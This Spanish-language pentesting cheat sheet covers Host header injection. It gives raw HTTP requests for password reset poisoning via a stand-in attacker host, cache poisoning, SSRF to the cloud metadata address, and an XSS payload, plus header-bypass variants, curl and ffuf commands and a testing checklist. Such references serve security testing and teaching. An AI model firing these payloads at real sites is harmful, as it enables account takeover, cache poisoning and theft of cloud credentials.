---
title: "Host Header Injection"
description: "El header Host es completamente controlable por el cliente."
category: "Web"
date: 2026-07-18
---
# 🏠 Host Header Injection

El header `Host` es completamente controlable por el cliente. Si la aplicación confía en él sin validación, permite password reset poisoning, cache poisoning, SSRF, y bypass de ACL.

---

## Vectores de ataque

### 1. Password Reset Poisoning (→ ATO)

```http
POST /forgot-password HTTP/1.1
Host: evil.attacker.com
Content-Type: application/x-www-form-urlencoded
email=victim@example.com
```

La app genera: `Click here: https://evil.attacker.com/reset?token=abc123`

La víctima hace click, el atacante captura el token, y lo usa para **tomar la cuenta**.

### 2. Cache Poisoning

Respuesta con URLs generadas dinámicamente desde el header → se cachea para todos:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.attacker.com
```

Si el cache almacena esto, todos los visitantes reciben la página con recursos desde `evil.attacker.com`.

### 3. Routing-Based SSRF

Algunos proxies eligen el backend según el Host:

```http
GET / HTTP/1.1
Host: 169.254.169.254   # AWS metadata
```

### 4. Web Cache Deception via Host

```http
GET /account/settings HTTP/1.1
Host: target.com
X-Forwarded-Host: target.com"><script>alert(1)</script>
```

---

## Headers alternativos a inyectar

Los servidores a veces usan otros headers antes que `Host`:

```
X-Forwarded-For: evil.com
X-Forwarded-Host: evil.com
X-Client-IP: evil.com
X-Remote-IP: evil.com
X-Remote-Addr: evil.com
X-Host: evil.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

---

## Técnicas de bypass

```
# Duplicar Host
Host: target.com
Host: evil.com

# Absolute URL
GET https://target.com/ HTTP/1.1
Host: evil.com

# Port injection
Host: target.com:@evil.com

# Ambiguous host
Host: target.com
Host: evil.com

# Line wrapping
 Host: target.com
Host: evil.com

# Encoded
Host: target.com%23.evil.com
```

---

## Herramientas y detección

```bash
# Probar con Burp Repeater
curl -H "Host: evil.com" https://target.com/forgot-password -d "email=test@test.com"

# Collaborator / interactsh para detectar callbacks
interactsh-client -v

# Automatizado con ffuf
ffuf -u https://target.com/ -H "Host: FUZZ" -w payloads.txt -fc 200
```

---

## Checklist de prueba

- [ ] Modificar `Host` en forgot-password y verificar si el link usa tu dominio
- [ ] Probar `X-Forwarded-Host`
- [ ] Probar `X-Host`, `X-Forwarded-For`, `X-Client-IP`
- [ ] Duplicar `Host` header
- [ ] Usar absolute URL
- [ ] Probar puerto malicioso: `Host: target.com:9999`
- [ ] Probar inyección en redirects (Location header)

---

## Reports públicos

- [Apple Hall of Fame via Host Header Injection](https://medium.com/@MohaseenK/how-a-host-header-injection-bug-earned-me-my-fourth-hall-of-fame-spot-at-apple-b5d880acbba2)
- [Password Reset Poisoning → ATO](https://cybersecuritynews.com/password-reset-poisoning-attack)
- [CVE-2026-34083: SignalK Host Header Injection](https://nvd.nist.gov/vuln/detail/CVE-2026-34083)

---

## Relacionado
- **Autenticacion Web** — password reset poisoning → ATO
- **Cache Poisoning y Web Cache Deception** — unkeyed header poisoning
- **HTTP Request Smuggling** — Host header desync
- **SSRF** — routing-based SSRF via Host
- **Claude-BugHunter** (skill `hunt-host-header`)
